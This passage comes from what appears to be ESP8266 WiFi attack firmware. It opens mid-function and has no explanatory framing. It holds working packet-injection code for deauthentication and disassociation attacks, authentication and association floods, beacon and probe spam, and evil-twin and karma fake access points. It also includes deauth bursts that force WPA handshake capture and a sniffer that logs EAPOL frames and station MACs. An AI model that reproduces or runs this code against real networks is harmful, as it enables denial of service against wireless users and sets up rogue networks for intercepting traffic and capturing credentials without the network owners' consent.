              deauth[24] = reasonCodes[i % 8];
              deauth[25] = 0; // Reason code high byte
              
              if (sendPacketSafely(deauth, sizeof(deauth))) {
                stats.deauthPackets++;
                totalPackets++;
              }
              sequenceNumber++;
              delayMicroseconds(100);
            }

            // Target specific stations
            for (const auto& station : stations) {
              if (station.ap_mac == accessPoints[currentAP].bssid) {
                memcpy(&deauth[4], station.mac_bytes, 6); // Target: station
                memcpy(&deauth[10], bssid, 6); // Source: AP
                
                deauth[22] = (sequenceNumber & 0xFF);
                deauth[23] = ((sequenceNumber >> 8) & 0x0F);
                
                if (sendPacketSafely(deauth, sizeof(deauth))) {
                  stats.deauthPackets++;
                  totalPackets++;
                }
                sequenceNumber++;
                delayMicroseconds(200);
              }
            }
          }
          break;

        case 1: // Disassociation attack
          {
            uint8_t disassoc[26];
            memcpy(disassoc, disassocPacket, sizeof(disassocPacket));
            
            memcpy(&disassoc[4], "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
            memcpy(&disassoc[10], bssid, 6);
            memcpy(&disassoc[16], bssid, 6);
            
            disassoc[22] = (sequenceNumber & 0xFF);
            disassoc[23] = ((sequenceNumber >> 8) & 0x0F);
            
            uint8_t disassocReasons[] = {1, 2, 3, 5, 6, 7};
            for (int i = 0; i < (aggressiveMode ? 3 : 1); i++) {
              disassoc[24] = disassocReasons[i % 6];
              disassoc[25] = 0;
              
              if (sendPacketSafely(disassoc, sizeof(disassoc))) {
                stats.disassocPackets++;
                totalPackets++;
              }
              sequenceNumber++;
              delayMicroseconds(150);
            }
          }
          break;

        case 2: // Authentication flood
          {
            uint8_t auth[30];
            memcpy(auth, authPacket, sizeof(authPacket));
            
            // Generate random MAC for auth flood
            for (int i = 0; i < 6; i++) {
              auth[10 + i] = random(0x02, 0xFF); // Ensure locally administered
            }
            memcpy(&auth[4], bssid, 6); // Target: AP
            memcpy(&auth[16], bssid, 6); // BSSID: AP
            
            auth[22] = (sequenceNumber & 0xFF);
            auth[23] = ((sequenceNumber >> 8) & 0x0F);
            
            for (int i = 0; i < (aggressiveMode ? 5 : 2); i++) {
              // Set authentication sequence number
              auth[26] = (i + 1) & 0xFF;
              auth[27] = ((i + 1) >> 8) & 0xFF;
              
              if (sendPacketSafely(auth, sizeof(auth))) {
                stats.authPackets++;
                totalPackets++;
              }
              sequenceNumber++;
              delayMicroseconds(100);
            }
          }
          break;

        case 3: // Association flood
          {
            uint8_t assoc[30];
            memcpy(assoc, assocPacket, sizeof(assocPacket));
            
            for (int i = 0; i < 6; i++) {
              assoc[10 + i] = random(0x02, 0xFF);
            }
            memcpy(&assoc[4], bssid, 6);
            memcpy(&assoc[16], bssid, 6);
            
            assoc[22] = (sequenceNumber & 0xFF);
            assoc[23] = ((sequenceNumber >> 8) & 0x0F);
            
            for (int i = 0; i < (aggressiveMode ? 3 : 1); i++) {
              if (sendPacketSafely(assoc, sizeof(assoc))) {
                stats.assocPackets++;
                totalPackets++;
              }
              sequenceNumber++;
              delayMicroseconds(200);
            }
          }
          break;
      }

      attackVector = (attackVector + 1) % 4;
    }

    currentAP++;
  }
}

void performBeaconSpam() {
  static unsigned long lastBeacon = 0;
  static int currentSSID = 0;
  static uint16_t sequenceNumber = 0;

  if (millis() - lastBeacon > 100) {
    lastBeacon = millis();

    int attempts = 0;
    int maxAttempts = minVal(5, (int)ssidList.size());
    
    while (attempts < maxAttempts) {
      if (currentSSID >= (int)ssidList.size()) {
        currentSSID = 0;
      }

      if (currentSSID < (int)ssidList.size() && ssidList[currentSSID].enabled) {
        String ssid = ssidList[currentSSID].ssid;

        uint8_t packet[128];
        int packetSize = 38; // Base beacon size

        // Copy beacon template
        memcpy(packet, beaconPacket, 36);

        // Generate random MAC address
        packet[10] = 0x02;
        for (int i = 11; i < 16; i++) {
          packet[i] = random(0x00, 0xFF);
        }
        memcpy(&packet[16], &packet[10], 6);

        // Set sequence number
        packet[22] = (sequenceNumber & 0xFF);
        packet[23] = ((sequenceNumber >> 8) & 0x0F);
        sequenceNumber++;

        // Enhanced timestamp
        uint64_t timestamp = millis() * 1000;
        memcpy(&packet[24], &timestamp, 8);

        // Beacon interval and capability
        packet[32] = 0x64; // 100 TU
        packet[33] = 0x00;
        packet[34] = 0x01; // ESS
        packet[35] = ssidList[currentSSID].wpa2 ? 0x10 : 0x00;

        // SSID element
        int ssidLen = minVal(32, (int)ssid.length());
        packet[36] = 0x00; // SSID element ID
        packet[37] = ssidLen;
        for (int i = 0; i < ssidLen; i++) {
          packet[38 + i] = ssid[i];
        }
        packetSize = 38 + ssidLen;

        // Add supported rates
        if (packetSize + 10 < 128) {
          packet[packetSize++] = 0x01; // Element ID
          packet[packetSize++] = 0x08; // Length
          packet[packetSize++] = 0x82; // 1 Mbps
          packet[packetSize++] = 0x84; // 2 Mbps
          packet[packetSize++] = 0x8B; // 5.5 Mbps
          packet[packetSize++] = 0x96; // 11 Mbps
          packet[packetSize++] = 0x24; // 18 Mbps
          packet[packetSize++] = 0x30; // 24 Mbps
          packet[packetSize++] = 0x48; // 36 Mbps
          packet[packetSize++] = 0x6C; // 54 Mbps

          // DS Parameter Set
          packet[packetSize++] = 0x03; // Element ID
          packet[packetSize++] = 0x01; // Length
          packet[packetSize++] = ssidList[currentSSID].channel;
        }

        if (sendPacketSafely(packet, packetSize)) {
          stats.beaconPackets++;
        }
        
        delayMicroseconds(300);
        break;
      }

      currentSSID++;
      attempts++;
    }

    currentSSID++;
  }
}

void performProbeAttack() {
  static unsigned long lastProbe = 0;
  static int currentSSID = 0;
  static uint16_t sequenceNumber = 0;

  if (millis() - lastProbe > 200) {
    lastProbe = millis();

    int attempts = 0;
    int maxAttempts = minVal(5, (int)ssidList.size());
    
    while (attempts < maxAttempts) {
      if (currentSSID >= (int)ssidList.size()) {
        currentSSID = 0;
      }

      if (currentSSID < (int)ssidList.size() && ssidList[currentSSID].enabled) {
        String ssid = ssidList[currentSSID].ssid;

        uint8_t packet[80];
        int packetSize = 24; // Base probe size

        // Copy probe template header
        packet[0] = 0x40; // Frame Control (Probe Request)
        packet[1] = 0x00;
        packet[2] = 0x00; // Duration
        packet[3] = 0x00;
        
        // Broadcast destination
        memset(&packet[4], 0xFF, 6);
        
        // Random source MAC
        packet[10] = 0x02; // Locally administered
        for (int i = 11; i < 16; i++) {
          packet[i] = random(0x00, 0xFF);
        }
        
        // Broadcast BSSID
        memset(&packet[16], 0xFF, 6);
        
        // Sequence number
        packet[22] = (sequenceNumber & 0xFF);
        packet[23] = ((sequenceNumber >> 8) & 0x0F);
        sequenceNumber++;

        // SSID element
        int ssidLen = minVal(32, (int)ssid.length());
        packet[packetSize++] = 0x00; // SSID element ID
        packet[packetSize++] = ssidLen;
        for (int i = 0; i < ssidLen; i++) {
          packet[packetSize++] = ssid[i];
        }

        // Add supported rates
        if (packetSize + 10 < 80) {
          packet[packetSize++] = 0x01; // Element ID
          packet[packetSize++] = 0x08; // Length
          packet[packetSize++] = 0x82; // 1 Mbps
          packet[packetSize++] = 0x84; // 2 Mbps
          packet[packetSize++] = 0x8B; // 5.5 Mbps
          packet[packetSize++] = 0x96; // 11 Mbps
          packet[packetSize++] = 0x24; // 18 Mbps
          packet[packetSize++] = 0x30; // 24 Mbps
          packet[packetSize++] = 0x48; // 36 Mbps
          packet[packetSize++] = 0x6C; // 54 Mbps
        }

        if (sendPacketSafely(packet, packetSize)) {
          stats.probePackets++;
        }

        break;
      }

      currentSSID++;
      attempts++;
    }

    currentSSID++;
  }
}

void performEvilTwin() {
  static unsigned long lastTwin = 0;
  static int twinIndex = 0;
  static uint16_t sequenceNumber = 0;

  if (millis() - lastTwin > 200) { // Faster evil twin creation
    lastTwin = millis();

    // Find selected networks for evil twin
    std::vector<int> selectedAPs;
    for (int i = 0; i < accessPoints.size(); i++) {
      if (accessPoints[i].selected) {
        selectedAPs.push_back(i);
      }
    }

    if (selectedAPs.size() > 0) {
      int currentAP = selectedAPs[twinIndex % selectedAPs.size()];
      
      // Create multiple evil twin variations
      String evilSSIDs[] = {
        accessPoints[currentAP].ssid + "_Free",
        accessPoints[currentAP].ssid + "_Guest", 
        accessPoints[currentAP].ssid + "_Open",
        "Free_" + accessPoints[currentAP].ssid,
        accessPoints[currentAP].ssid + "_Public"
      };

      for (int variant = 0; variant < 3; variant++) { // Create 3 variants per cycle
        String evilSSID = evilSSIDs[variant % 5];
        
        uint8_t packet[128];
        int packetSize = 24; // Start with fixed parameters

        // Create proper beacon frame
        packet[0] = 0x80; // Frame Control - Beacon
        packet[1] = 0x00;
        packet[2] = 0x00; // Duration
        packet[3] = 0x00;
        
        // Destination (broadcast)
        memset(&packet[4], 0xFF, 6);
        
        // Source MAC (modified from original)
        memcpy(&packet[10], accessPoints[currentAP].bssid_bytes, 6);
        packet[15] = (packet[15] + variant + 1) % 256; // Slight variation
        
        // BSSID (same as source)
        memcpy(&packet[16], &packet[10], 6);

        // Sequence number
        packet[22] = (sequenceNumber & 0xFF);
        packet[23] = ((sequenceNumber >> 8) & 0x0F);
        sequenceNumber++;

        // Fixed parameters (timestamp, beacon interval, capability)
        memset(&packet[24], 0, 8); // Timestamp
        packet[32] = 0x64; // Beacon interval (100 TU)
        packet[33] = 0x00;
        packet[34] = 0x01; // Capability - ESS (infrastructure mode)
        packet[35] = 0x00; // No privacy (open network)

        packetSize = 36;

        // SSID element
        int ssidLen = minVal(32, (int)evilSSID.length());
        packet[packetSize++] = 0x00; // SSID element ID
        packet[packetSize++] = ssidLen; // SSID length
        for (int i = 0; i < ssidLen; i++) {
          packet[packetSize++] = evilSSID[i];
        }

        // Supported rates element
        packet[packetSize++] = 0x01; // Element ID
        packet[packetSize++] = 0x08; // Length
        packet[packetSize++] = 0x82; // 1 Mbps
        packet[packetSize++] = 0x84; // 2 Mbps
        packet[packetSize++] = 0x8B; // 5.5 Mbps
        packet[packetSize++] = 0x96; // 11 Mbps
        packet[packetSize++] = 0x24; // 18 Mbps
        packet[packetSize++] = 0x30; // 24 Mbps
        packet[packetSize++] = 0x48; // 36 Mbps
        packet[packetSize++] = 0x6C; // 54 Mbps

        // DS Parameter Set (channel)
        packet[packetSize++] = 0x03; // Element ID
        packet[packetSize++] = 0x01; // Length
        packet[packetSize++] = accessPoints[currentAP].channel;

        // Set channel and send
        wifi_set_channel(accessPoints[currentAP].channel);
        
        if (sendPacketSafely(packet, packetSize)) {
          stats.beaconPackets++;
          stats.evilTwinClients++;
        }

        delayMicroseconds(100); // Small delay between variants
      }
    }

    twinIndex++;
  }
}

void performKarmaAttack() {
  static unsigned long lastKarma = 0;
  static int karmaIndex = 0;
  static uint16_t sequenceNumber = 0;

  if (millis() - lastKarma > 300) {
    lastKarma = millis();

    // Respond to probe requests with fake beacons
    if (karmaIndex < 10) {
      String karmaSSID = "FreeWiFi_" + String(karmaIndex);
      
      uint8_t packet[128];
      int packetSize = 38;

      // Copy beacon template
      memcpy(packet, beaconPacket, 36);

      // Random MAC
      packet[10] = 0x02;
      for (int i = 11; i < 16; i++) {
        packet[i] = random(0x00, 0xFF);
      }
      memcpy(&packet[16], &packet[10], 6);

      // Set sequence number
      packet[22] = (sequenceNumber & 0xFF);
      packet[23] = ((sequenceNumber >> 8) & 0x0F);
      sequenceNumber++;

      // Set karma SSID
      int ssidLen = minVal(20, (int)karmaSSID.length());
      packet[36] = 0x00;
      packet[37] = ssidLen;
      for (int i = 0; i < ssidLen; i++) {
        packet[38 + i] = karmaSSID[i];
      }
      packetSize = 38 + ssidLen;

      if (sendPacketSafely(packet, packetSize)) {
        stats.beaconPackets++;
      }
    }

    karmaIndex = (karmaIndex + 1) % 10;
  }
}

void performMitmAttack() {
  // Real MITM attack implementation would require more complex packet handling
  static unsigned long lastMitm = 0;
  
  if (millis() - lastMitm > 1000) {
    lastMitm = millis();
    // MITM attack logic would go here - intercepting and modifying packets
  }
}

void performHandshakeCapture() {
  // Handshake capture is handled in packetSniffer function
  // This function triggers deauth to force handshake
  static unsigned long lastHandshakeDeauth = 0;
  static uint16_t sequenceNumber = 0;
  
  if (millis() - lastHandshakeDeauth > 5000) {
    lastHandshakeDeauth = millis();
    
    // Send targeted deauth to force handshake
    for (const auto& ap : accessPoints) {
      if (ap.selected && ap.hasClients) {
        // Set channel for this AP
        wifi_set_channel(ap.channel);
        
        // Deauth clients to capture handshake
        uint8_t deauth[26];
        memcpy(deauth, deauthPacket, sizeof(deauthPacket));
        memcpy(&deauth[10], ap.bssid_bytes, 6);
        memcpy(&deauth[16], ap.bssid_bytes, 6);
        
        for (const auto& station : stations) {
          if (station.ap_mac == ap.bssid) {
            memcpy(&deauth[4], station.mac_bytes, 6);
            
            deauth[22] = (sequenceNumber & 0xFF);
            deauth[23] = ((sequenceNumber >> 8) & 0x0F);
            sequenceNumber++;
            
            sendPacketSafely(deauth, sizeof(deauth));
            delayMicroseconds(500);
          }
        }
      }
    }
  }
}

void packetSniffer(uint8_t *buf, uint16_t len) {
  if (!buf || len < 24) return;

  stats.capturedPackets++;

  // Enhanced packet analysis
  uint8_t frameType = buf[0] & 0x0C;
  uint8_t frameSubType = (buf[0] & 0xF0) >> 4;

  // Track unique devices
  static uint8_t seenMACs[30][6];
  static int macCount = 0;
  static unsigned long lastCleanup = 0;

  if (millis() - lastCleanup > 180000) { // 3 minutes
    macCount = 0;
    lastCleanup = millis();
  }

  uint8_t* srcMAC = nullptr;
  uint8_t* dstMAC = nullptr;

  // Enhanced frame parsing
  switch (frameType) {
    case 0x00: // Management frame
      dstMAC = &buf[4];
      srcMAC = &buf[10];
      
      // Detect WPA handshake frames
      if (frameSubType == 0x08 && len > 32) { // Beacon
        // Extract SSID from beacon
      } else if (frameSubType == 0x0B) { // Authentication
        if (handshakeCapture) {
          stats.handshakes++;
        }
      } else if (frameSubType == 0x00) { // Association request
        if (handshakeCapture) {
          stats.handshakes++;
        }
      }
      break;
      
    case 0x04: // Control frame
      if (len >= 16) {
        dstMAC = &buf[4];
        if (len >= 22) srcMAC = &buf[10];
      }
      break;
      
    case 0x08: // Data frame
      if (len >= 30) {
        dstMAC = &buf[4];
        srcMAC = &buf[16];
        
        // Detect EAPOL frames (WPA handshake)
        if (handshakeCapture && len > 32) {
          uint16_t ethType = (buf[32] << 8) | buf[33];
          if (ethType == 0x888E) { // EAPOL
            stats.handshakes++;
          }
        }
      }
      break;
  }

  // Track unique MACs
  auto addMAC = [&](uint8_t* mac) {
    if (!mac || macCount >= 30) return;
    
    // Check if MAC already seen
    for (int i = 0; i < macCount; i++) {
      if (memcmp(seenMACs[i], mac, 6) == 0) return;
    }
    
    // Add new MAC
    memcpy(seenMACs[macCount], mac, 6);
    macCount++;
    stats.uniqueDevices = macCount;
  };

  if (srcMAC && !(srcMAC[0] == 0xFF && srcMAC[1] == 0xFF)) {
    addMAC(srcMAC);
  }
  if (dstMAC && !(dstMAC[0] == 0xFF && dstMAC[1] == 0xFF)) {
    addMAC(dstMAC);
  }

  // Station detection for management frames
  if (frameType == 0x00 && len >= 24) {
    if (frameSubType == 0x04 || frameSubType == 0x00) { // Probe request or Association request
      // Extract station info
      Station newStation;
      
      // Convert MAC to string
      newStation.mac = "";
      for (int i = 0; i < 6; i++) {
        if (i > 0) newStation.mac += ":";
        if (srcMAC[i] < 16) newStation.mac += "0";
        newStation.mac += String(srcMAC[i], HEX);
      }
      
      newStation.channel = WiFi.channel();
      newStation.rssi = -50; // Approximate
      newStation.selected = false;
      newStation.lastSeen = millis();
      memcpy(newStation.mac_bytes, srcMAC, 6);
      
      // Check if station already exists
      bool exists = false;
      for (auto& existing : stations) {
        if (existing.mac == newStation.mac) {
          existing.lastSeen = millis();
          exists = true;
          break;
        }
      }
      
      if (!exists && stations.size() < MAX_STATIONS) {
        stations.push_back(newStation);
      }
    }
  }
}

void updateLED() {
  static unsigned long lastLED = 0;
  static bool ledState = false;

  unsigned long interval = 1000;

  if (attacking || evilTwinAttack || aggressiveMode) {
    interval = 50; // Very fast blink for attacks
  } else if (beaconSpam || probeAttack || karmaAttack) {
    interval = 100; // Fast blink for spam attacks
  } else if (scanning || packetMonitor || handshakeCapture) {
    interval = 250; // Medium blink for monitoring
  } else if (pmkidAttack) {
    interval = 500; // Slow blink for passive attacks
  }

  if (millis() - lastLED > interval) {
    lastLED = millis();
    ledState = !ledState;
    digitalWrite(LED_PIN, ledState ? LOW : HIGH);
  }
}

void saveSettings() {
  if (packetsPerSecond >= 10 && packetsPerSecond <= 100) {
    EEPROM.write(0, packetsPerSecond);
  }
  EEPROM.write(1, captivePortal ? 1 : 0);
  EEPROM.write(2, aggressiveMode ? 1 : 0);
  
  int ssidCount = minVal(MAX_SSIDS, (int)ssidList.size());
  EEPROM.write(3, ssidCount);

  int addr = 4;
  for (int i = 0; i < ssidCount && addr < 500; i++) {
    int ssidLen = minVal(32, (int)ssidList[i].ssid.length());
    EEPROM.write(addr++, ssidLen);
    for (int j = 0; j < ssidLen && addr < 500; j++) {
      EEPROM.write(addr++, ssidList[i].ssid[j]);
    }
    if (addr < 500) EEPROM.write(addr++, ssidList[i].enabled ? 1 : 0);
    if (addr < 500) EEPROM.write(addr++, ssidList[i].wpa2 ? 1 : 0);
    if (addr < 500) EEPROM.write(addr++, ssidList[i].hidden ? 1 : 0);
    if (addr < 500) EEPROM.write(addr++, ssidList[i].channel);
  }

  EEPROM.commit();
}

void loadSettings() {
  int pps = EEPROM.read(0);
  if (pps >= 10 && pps <= 100) {
    packetsPerSecond = pps;
  } else {
    packetsPerSecond = 50;
  }

  captivePortal = EEPROM.read(1) == 1;
  aggressiveMode = EEPROM.read(2) == 1;

  int ssidCount = EEPROM.read(3);
  if (ssidCount > MAX_SSIDS || ssidCount < 0) ssidCount = 0;

  int addr = 4;
  ssidList.clear();

  for (int i = 0; i < ssidCount && addr < 500; i++) {
    SSIDData ssid;
    int len = EEPROM.read(addr++);
    if (len > 32 || len < 0 || addr >= 500) break;

    ssid.ssid = "";
    for (int j = 0; j < len && addr < 500; j++) {
      ssid.ssid += (char)EEPROM.read(addr++);
    }
    if (addr < 500) ssid.enabled = EEPROM.read(addr++) == 1;
    if (addr < 500) ssid.wpa2 = EEPROM.read(addr++) == 1;
    if (addr < 500) ssid.hidden = EEPROM.read(addr++) == 1;
    if (addr < 500) ssid.channel = EEPROM.read(addr++);

    if (ssid.ssid.length() > 0) {
      ssidList.push_back(ssid);
    }
  }
}
